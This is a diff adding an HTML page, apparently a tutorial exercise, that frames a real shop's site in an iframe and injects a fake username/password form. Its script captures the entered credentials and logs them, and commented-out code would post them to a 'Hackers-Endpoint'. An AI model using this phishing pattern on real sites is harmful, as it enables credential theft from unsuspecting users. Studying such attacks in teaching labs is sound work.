@@ -1,0 +1,88 @@
+<!doctype html>
+<html class="no-js" lang="">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Tutorial 4</title>
+  <link rel="stylesheet" href="css/normalize.css">
+  <link rel="stylesheet" href="css/main.css">
+</head>
+
+<body>
+     <iframe class='iframe' id='iframe', src='http://www.digitec.ch'></iframe>
+  <p>Timon Iori</p>
+  
+	<script type="text/javascript">
+	
+		//1. Creates a HTML Form Objhect with Javascript
+        var form = document.createElement('form');
+        form.setAttribute('method', 'POST');
+        form.setAttribute('accept-charset', 'utf-8');
+        form.setAttribute('action', '');
+        form.setAttribute('id', 'myform');
+		form.setAttribute('style', 'border; 1px solid red');
+		
+		// 2. Creates an HTML Username Input Object with Javascript
+        var input_username = document.createElement('input');
+        input_username.setAttribute('name', 'username');
+        input_username.setAttribute('type', 'text');
+        input_username.setAttribute('id', 'username');
+        
+		// 3.  Creates a HTML Password Input Object Javascript 
+        var input_password = document.createElement('input');
+        input_password.setAttribute('name', 'password');
+        input_password.setAttribute('type', 'password');
+        input_password.setAttribute('id', 'password');
+		
+		// 4. Create a HTML Submit-Button Object with Javascript 
+        var input_submit_button = document.createElement('input');
+        input_submit_button.setAttribute('name', 'submit');
+        input_submit_button.setAttribute('value', 'login');
+        input_submit_button.setAttribute('type', 'submit');
+		
+		// 5. Add all Elements to the form 
+        form.appendChild(input_username);
+        form.appendChild(document.createElement('br'));
+        form.appendChild(input_password);
+        form.appendChild(document.createElement('br'));
+        form.appendChild(document.createElement('br'));
+        form.appendChild(input_submit_button);
+		
+		// 6. Add the Form Object with all its children to the HTML Document-Object
+        document.getElementsByTagName('body')[0].appendChild(form);
+		
+		// 7. Creates an Event Listener for the form submit action.
+		// a) either on the Form-Object ("on submit")
+		// b) or on the submit-button input
+		// Info: the event has to be registered on the dynamically added Objects and not on the document itself!
+		
+		form.addEventListener("submit", function (e) {
+		
+			e.preventDefault();
+            e.stopPropagation();
+			
+			// prevents the submission of other  forms to be handled
+            if (e.target && e.target.id === 'myform') {
+			
+                var xhr = new XMLHttpRequest();
+				
+                var username = document.getElementById('username').value;
+                var password = document.getElementById('password').value;
+				
+				// 7.1 (debug): logs the results in the console
+				// click F12 in Browser in order to open the Web-Console
+                console.log('username is ', username);
+                console.log('password is ', password);
+				
+				// 7.2 Sends the values to the Hackers-Endpoint. In our case our own .NET MVC Application
+				// var xhr = new XMLHttpRequest();
+                // xhr.open('POST', 'Url');
+                // xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                // xhr.send('username=' + username + '&password=' + password);
+            }
+		});
+
+	</script>
+  
+</body>
+</html>
